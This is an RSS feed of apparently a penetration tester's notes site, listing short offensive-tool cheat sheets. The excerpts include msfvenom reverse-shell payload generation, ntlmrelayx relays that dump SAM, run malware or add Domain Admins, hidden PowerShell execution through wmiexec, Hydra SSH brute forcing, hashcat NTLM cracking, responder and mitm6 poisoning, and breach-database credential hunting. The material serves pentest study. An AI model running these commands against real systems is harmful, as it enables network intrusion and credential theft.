<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Tools on My notes and snippets</title><link>https://dev-hugo.justin-p.me/tags/tools/</link><description>Recent content in Tools on My notes and snippets</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Tue, 26 Jan 2021 17:27:07 +0100</lastBuildDate><atom:link href="https://dev-hugo.justin-p.me/tags/tools/index.xml" rel="self" type="application/rss+xml"/><item><title>hugo</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/hugo/</link><pubDate>Tue, 26 Jan 2021 17:27:07 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/hugo/</guid><description>hugo Usage hugo [command] [flags] Flags hugo is the main command, used to build your Hugo site. Hugo is a Fast and Flexible Static Site Generator built with love by spf13 and friends in Go. Complete documentation is available at http://gohugo.io/. Usage: hugo [flags] hugo [command] Available Commands: config Print the site configuration convert Convert your content to different formats deploy Deploy your site to a Cloud provider. env Print Hugo version and environment info gen A collection of several useful generators.</description></item><item><title>hash identifier</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/hash-identifier/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/hash-identifier/</guid><description>hash identifier hash-identifier HASH</description></item><item><title>hashcat</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/hashcat/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/hashcat/</guid><description>hashcat basic wordlist Attack NTLM hashes using wordlist, enable custom kernels (limits lenght of pass to 27, better speed), use workload 3 and save in cracked_hashes
hashcat -a 0 -m 1000 -O -w 3 hashfile wordlist -o cracked_hashes wordlist + rulelist hashcat -a 0 -m 1000 -O -w 3 hashfile wordlist -o cracked_hashes -r rule one-rule-to-rule-them-all https://www.notsosecure.com/one-rule-to-rule-them-all/
https://github.com/NotSoSecure/password_cracking_rules
bruteforcing predefined charsets ?l = abcdefghijklmnopqrstuvwxyz ?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ ?d = 0123456789 ?</description></item><item><title>msfvenom</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/msfvenom/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/msfvenom/</guid><description>msfvenom source
MSFVenom Payload Generation One-Liner Description msfvenom -l payloads List available payloads msfvenom -p PAYLOAD &amp;ndash;list-options List payload options msfvenom -p PAYLOAD -e ENCODER -f FORMAT -i ENCODE COUNT LHOST=IP Payload Encoding msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &amp;gt; shell.elf Linux Meterpreter reverse shell x86 multi stage msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf &amp;gt; shell.</description></item><item><title>ntlmrelayx</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/ntlmrelayx/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/ntlmrelayx/</guid><description>ntlmrelayx Relay to Workstations other Clients dump SAM ntlmrelayx.py -tf targets.txt -smb2support
interactive session ntlmrelayx.py -tf targets.txt -smb2support -i
Execute a file ntlmrelayx.py -tf targets.txt -smb2support -e malware.exe
Execute a command ntlmrelayx.py -tf targets.txt -smb2support -c &amp;quot;whoami&amp;quot;
Relay to AD with LDAP Basic command This command will:
dump LDAP information if credentials allow it add a Domain Admin account (user is added to Enterprise Admins group) setup a &amp;lsquo;domain user&amp;rsquo; account with ACL rights to preform a DCsync.</description></item><item><title>psexec</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/psexec/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/psexec/</guid><description>psexec MSFConsole exploit/windows/smb/psexec
PSExec.py psexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101
alternatives smbexec smbexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101
wmiexec Example 1 wmiexec.py lab.justin-p.me/dwalker:StrongPass1@10.11.12.101
Example 2 wmiexec.py lab.justin-p.me/dwalker@10.11.12.101 'powershell -exec bypass -Noninteractive -windowstyle hidden -e 'PAYLOAD' -hashes a:hash</description></item><item><title>responder</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/responder/</link><pubDate>Tue, 10 Mar 2020 16:43:46 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/responder/</guid><description>responder Basic usage run responder on eth0
responder -I eth0
Anaylise mode responder -I eth1 -A
Set and forget (silent for users) !!! likely break stuff on the network !!!
Verbose Enable answers for netbios wredir suffix queries. Enable answers for netbios domain suffix queries. Start the WPAD rogue proxy server. Fingerprint a host that issued an NBT-NS or LLMNR query. responder -I eth1 -rdwfv
Set and forget (interactive) !</description></item><item><title>Hydra</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/hydra/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/hydra/</guid><description>Hydra known username, password list root with passwordlist, null password, login as pass and reversed login as pass.
hydra -v -V -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr user list, password list userlist with passwordlist, null password, login as pass and reversed login as pass looped around users.
hydra -v -V -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt 192.168.88.129 ssh -t 8 -e nsr -u</description></item><item><title>mitm6</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/mitm6/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/mitm6/</guid><description>mitm6 Basic command Command below will send out IPv6 RA and catch DNS requests for lab.justin-p.me.
sudo mitm6 -i eth0 -d lab.justin-p.me</description></item><item><title>searchsploit</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/searchsploit/</link><pubDate>Tue, 10 Mar 2020 16:43:45 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/searchsploit/</guid><description>searchsploit Search searchsploit &amp;quot;Samba &amp;lt; 2.&amp;quot; show web url instead of local searchsploit -w &amp;quot;Samba &amp;lt; 2.&amp;quot; open exploit in editor searchsploit -x exploits/linux/remote/16321.rb copy exploit to current folder searchsploit -m exploits/linux/remote/16321.rb</description></item><item><title>Credential Gathering</title><link>https://dev-hugo.justin-p.me/notes/hacking/external/credential-gathering/</link><pubDate>Tue, 10 Mar 2020 16:43:44 +0100</pubDate><guid>https://dev-hugo.justin-p.me/notes/hacking/external/credential-gathering/</guid><description>Credential Gathering When you want to infiltrate an organization gaining some form of credentials will be key. One of the ways to gain these credentials is to search database and other form of leaks. A user might reuse his password on multiple accounts or use a specific pattern in their passwords.
External services Service info weleakinfo Data Breach Search Engine scylla.sh db dumps and more (Search Engine) hashes.</description></item><item><title>nc</title><link>https://dev-hugo.justin-p.me/cheatsheets/tools/nc/</link><pubDate>Tue, 10 Mar 2020 16:36:30 +0100</pubDate><guid>https://dev-hugo.justin-p.me/cheatsheets/tools/nc/</guid><description>nc Usage nc OPTIONS HOST PORT Flags -4 Forces nc to use IPv4 addresses only. -6 Forces nc to use IPv6 addresses only. -b Allow broadcast. -C Send CRLF as line-ending. -D Enable debugging on the socket. -d Do not attempt to read from stdin. -h Prints out nc help. -I length Specifies the size of the TCP receive buffer. -i interval Specifies a delay time interval between lines of text sent and received.</description></item></channel></rss>